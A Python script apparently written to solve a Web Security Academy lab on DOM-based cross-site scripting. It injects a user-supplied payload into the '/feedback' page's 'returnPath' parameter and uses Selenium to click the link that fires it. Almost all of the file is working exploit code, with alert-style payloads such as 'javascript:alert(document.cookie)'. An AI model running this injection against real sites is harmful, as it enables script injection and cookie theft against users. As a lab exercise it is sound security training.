#!/usr/bin/env python3 

import requests
import urllib3
import argparse
from selenium import webdriver
from argparse import RawTextHelpFormatter

# Disable warnings related to certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser(description="""Cross-Site Scripting (XSS) Web Security Academy

Example usage with proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "javascript:alert(document.cookie)" -p 127.0.0.1:8080

Example usage without proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "javascript:alert(document.cookie)" 

If you encounter this error: "selenium.common.exceptions.WebDriverException: Message: 'geckodriver' executable needs to be in PATH." you can follow this guide: https://askubuntu.com/questions/870530/how-to-install-geckodriver-in-ubuntu
""", usage='use "python3 %(prog)s --help" for more information', formatter_class=RawTextHelpFormatter)
parser.add_argument('-u', '--url', help='URL, Example: https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net', required=True)
parser.add_argument('-c', '--command', help='Command to run, Example: <img src=x onerror=alert(\'XSS\')>', required=True)
parser.add_argument('-p', '--proxy', help='Proxy, Example: 127.0.0.1:8080', required=False)
args = parser.parse_args()

if args.url.endswith("/"):
    url = args.url[:-1]
else: 
    url = args.url
command = args.command

def click_btn(url, command):
    driver = webdriver.Firefox()
    btn_path = '/feedback?returnPath=' + command
    driver.get(url + btn_path)
    button_element = driver.find_element_by_id('backLink')
    button_element.click()

def xss(url, command):
    path = '/feedback'
    params = {
        'returnPath': command
    }
    if args.proxy:
        args.proxy=str(args.proxy)
        proxies = {
            'http': 'http://' + args.proxy,
            'https': 'http://' + args.proxy,
        }
        requests.get(url + path, params=params, verify=False, proxies=proxies)
    else:
        requests.get(url + path, params=params, verify=False)
        r = requests.get(url + path, params=params, verify=False)
        # verify the response contains the Congratulations, you solved the lab!
        if (b'Congratulations, you solved the lab!' in r.content):
            print("(+) DOM-based XSS Successful!")
        else:
            print("(-) DOM-based XSS Failed")

def main():
    
    print("(+) Exploiting DOM-based XSS")
        
    xss(url, command)

    click_btn(url, command)

if __name__ == "__main__":
    main()
